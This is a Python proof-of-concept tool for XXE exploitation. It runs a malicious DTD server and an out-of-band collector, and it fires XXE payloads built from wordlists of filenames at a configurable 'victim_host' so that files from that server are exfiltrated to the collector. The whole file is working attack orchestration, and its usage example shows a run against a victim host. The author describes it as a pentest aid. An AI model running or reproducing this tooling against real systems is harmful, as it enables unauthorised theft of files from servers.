'''
POC script to automate xxe detection and exploitation on a particular application being tested by me.
Idea is to evolve this scipt into a generic xxe detector based on template payloads and automated fuzzing.
mkocbayi@gmail.com
Note: If you set thread limit too high (>10) you may have miss data.
Some files that should be exfiltrated may not return because of their size.
'''
from __future__ import print_function
from socket import *
import os
import sys
script_path = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(script_path, 'libs'))
import signal
from signal import *
from DtdServer import DtdServer
from threading import Thread
from Smasher import Smasher
from Queue import Queue
import argparse
import collectors
import getopt
#used for retrieving ip address of iface
import netifaces as ni
import datetime
import threading
from copy import deepcopy
import logging
import pprint
#logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

settings = {
    'collector_message_queue' : Queue(), 
    'dtd_message_queue' : Queue(),
    'smasher_message_queue' : Queue(),
    'collector_port' : None,
    'dtd_host' : None,
    'dtd_port' : None,
    'collector_host' : None,
    'victim_host' : None,
    'sif' : None,
    'victim_tls' : False,
    'debug': False, 
    'script_path': script_path, 
    'wordlists_path': os.path.join(script_path, 'wordlists'),
    'exfiltrate_wordlists': os.path.join(script_path, 'wordlists',
                                         'exfiltrate_wordlists'),
    'log_path': os.path.join(script_path, 'logs'),
    'log_results_path' : os.path.join(script_path, 'files'),
    'collector_messages' : [], #list of received messages from threads
    'dtd_messages' : [], #list of received messages from threads
    'smasher_messages' : [], #list of received messages from threads
    'thread_limit' : 1, #number of threads for scanning
}

thread_jobs = []
lock = threading.Lock()

#Used for helping with printing with threads
print = lambda x: sys.stdout.write("%s\n" % x)
sys.stdout.flush()


def catchSignal(*args):
    sys.exit(0)


for sig in (SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM):
    signal(sig, catchSignal)


def set_new_log_path():
    current_datetime = datetime.datetime.now()
    filename = current_datetime.strftime("%Y%m%d_%H%M%S")
    settings['log_results_path'] = os.path.join(settings['log_path'], filename)
    os.makedirs(settings['log_results_path'])
    

def getDtdServer(collector_url):
    def doDtdServer():
        template_name = os.path.join(settings['script_path'],
                                     'templates', 'dtd', 'send.dtd')
        dtd_server = DtdServer(
                queue=settings['dtd_message_queue'], 
                collector_url=collector_url,
                port=settings['dtd_port'], 
                template_name=template_name, 
                debug = settings['debug'], 
                )
        dtd_server.run()
    return doDtdServer


def doReceiveCollectorMessages():
    with open(os.path.join(
            settings['log_results_path'], 'manifest.csv'), 'w') as f:
        while True:
            print("Waiting for Collector messages")
            message = settings['collector_message_queue'].get(block=True)
            collector_job = getMessageWithScanID(
                message['scan_id'], settings['collector_messages'])

            if collector_job:
                print("{}: already collected")
                collector_job['count'] = collector_job['count'] + 1
            else:
                scan_job = getMessageWithScanID(message['scan_id'],
                                                settings['smasher_messages'])
                if scan_job:
                    f.write("{0},{1},{2}\n".format(
                        message['file_id'],
                        message['source_ip'],
                        scan_job['exfiltrate_filename']))
                else:
                    print("{}: no corresponding scan job".format(
                        message['scan_id']))

            if settings['debug']:
                print(message)


def getMessageWithScanID(scan_id, message_list):
    for message in message_list:
        if message['scan_id'] == scan_id:
            return message


def doReceiveDtdMessages():
    while True:
        print("Waiting for DTD messages")
        message = settings['dtd_message_queue'].get()
        settings['dtd_messages'].append(deepcopy(message))
        if settings['debug']:
            print(message)


def doReceiveSmasherMessages():
    print("\nWaiting for Smasher messages")
    while True:
        print("\nReceived Smasher message")
        message = settings['smasher_message_queue'].get()
        settings['smasher_messages'].append(deepcopy(message))
        if settings['debug']:
            print(message)


def read_user_input():
    while True:
        user_input = raw_input('Type q to quit\n')
        if user_input == 'q':
            sys.exit(0)
    
def doStartThreads():
    collector_obj = getattr(collectors, settings['collector_type'])
    collector = collector_obj(
        (settings['collector_host'], settings['collector_port']),
        settings['log_results_path'],
        settings['collector_message_queue'])
    collector.daemon = True
    thread_jobs.append(collector)

    thread = Thread(target=getDtdServer(collector.get_exfil_url('$scan_id')))
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveCollectorMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveDtdMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveSmasherMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doStartSmasher)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=read_user_input)
    thread.daemon = False #This thread will allow the main script to block while waiting for user input
    thread_jobs.append(thread)

    print('*** Main thread waiting')
    for thread_job in thread_jobs:
        thread_job.start()
    print('*** Done')
    

def doStartSmasher():
    template_name = os.path.join(settings['script_path'],
                                 'templates', 'smasher', 'post.http')
    smasher = Smasher(queue=settings['smasher_message_queue'], 
                      victim_host=settings['victim_host'], 
                      dtd_server=settings['dtd_host'], 
                      dtd_port=settings['dtd_port'], 
                      port=settings['victim_port'], 
                      tls=settings['victim_tls'], 
                      template_name=template_name, 
                      dtd_filename='send.dtd', 
                      exfiltrate_wordlists=settings['exfiltrate_wordlists'], 
                      debug=settings['debug'], 
                      thread_limit=settings['thread_limit'])
    smasher.run()

def usage():
    print(' -------------------------------------------------------------------------')
    print(' Mutti K September 11th, 2015')
    print(' -------------------------------------------------------------------------')
    print(' Example run')
    print(' kisskissie.py --dtd_host=10.10.10.10 --collector_port=80 --dtd_port=8888 --victim_host=host.victim.com --victim_port=443 --victim_tls=1')
    print(' Results saved to log files in log directory.')
    print(' ')
    sys.exit(' ')


def get_ip_address(ifname):
    return ni.ifaddresses(ifname)[2][0]['addr']

def main(argv):
    set_new_log_path()

    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--dtd_host', required=True)
    parser.add_argument('--dtd_port', type=int, required=True)
    parser.add_argument('--collector_type', default="FTPCollector")
    parser.add_argument('--collector_host', required=True)
    parser.add_argument('--collector_port', type=int, required=True)
    parser.add_argument('--timeout')
    parser.add_argument('--sif')
    parser.add_argument('--thread_limit', type=int, default=1)
    parser.add_argument('--victim_host', required=True)
    parser.add_argument('--victim_port', type=int)
    parser.add_argument('--victim_tls', type=int)
    args = parser.parse_args()
    settings.update(vars(args))

    doStartThreads()
    
if __name__=='__main__':
    try:
        main(sys.argv[1:])
    except Exception as e:
        print('Cannot run program.\n%s' %e)
        sys.exit(0)
